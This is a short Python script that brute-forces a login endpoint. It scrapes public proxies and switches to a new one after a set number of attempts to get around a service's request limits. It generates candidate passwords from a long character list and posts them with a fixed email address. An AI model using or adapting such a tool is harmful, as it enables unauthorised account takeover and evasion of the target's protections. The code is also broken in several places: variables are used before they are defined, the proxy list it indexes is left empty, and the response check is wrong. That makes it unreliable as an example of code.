import http.client
import json
from Proxy_List_Scrapper import Scrapper, Proxy, ScrapperException

crlen=6 #character length
service_limit=100 #services block limit max.


scrapper = Scrapper(category= 'ALL', print_err_trace=False)
proxlister=[]
data = scrapper.getProxies()
for item in data.proxies:
	psl.append([item.ip, item.port])


alf = ["¤","¶","§"," ","!","#","$","%","&","'","(",")","*","+",",","-",".","/","0","1","2","3","4","5","6","7","8","9",":",";","<","=",">","?","@","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","[","]","^","_","`","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","{","|","}","~","","Ç","ü","é","â","ä","à","å","ç","ê","ë","è","ï","î","ì","æ","Æ","ô","ö","ò","û","ù","ÿ","¢","£","¥","P","ƒ","á","í","ó","ú","ñ","Ñ","¿","¬","½","¼","¡","«","»","¦","ß","µ","±","°","•","·","²","€","„","…","†","‡","ˆ","‰","Š","‹","Œ","‘","’","“","”","–","—","˜","™","š","›","œ","Ÿ","¨","©","®","¯","³","´","¸","¹","¾","À","Á","Â","Ã","Ä","Å","È","É","Ê","Ë","Ì","Í","Î","Ï","Ð","Ò","Ó","Ô","Õ","Ö","×","Ø","Ù","Ú","Û","Ü","Ý","Þ","ã","ð","õ","÷","ø","ü","ý","þ"]
psl=[0,0,0,0]
if crlen > 4:
	for x in range(0,crlen-4):
		psl.append(0)
		pass
a=0
b=0
c=0




while a==0:
	if c == service_limit:
		b=b+1
		c=0	
	conn = http.client.HTTPSConnection(proxlister[b][0], proxlister[b][1])
	conn.set_tunnel("domain")
	headers = {'Content-type': 'application/json'}
	#headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Cafari/537.36'}
	json_data = json.dumps(foo)
	conn.request('POST', '/v1/login/url', json_data, headers)
	code=""
	for x in range(0,len(psl)):
		code=code+alf[psl[x]]
		pass
	foo = {'email': 'your_mail','password': code}
	print (code)
	response = conn.getresponse()
	if response == 'accept':
		a=1
	psl[len(psl)-1]=psl[len(psl)-1]+1
	for x in range(len(psl)-1,-1,-1):
		if psl[0] == 12:
			a=1
		if  psl[x]== 12:
			psl[x]=0
			psl[x-1]=psl[x-1]+1	
		pass
	pass		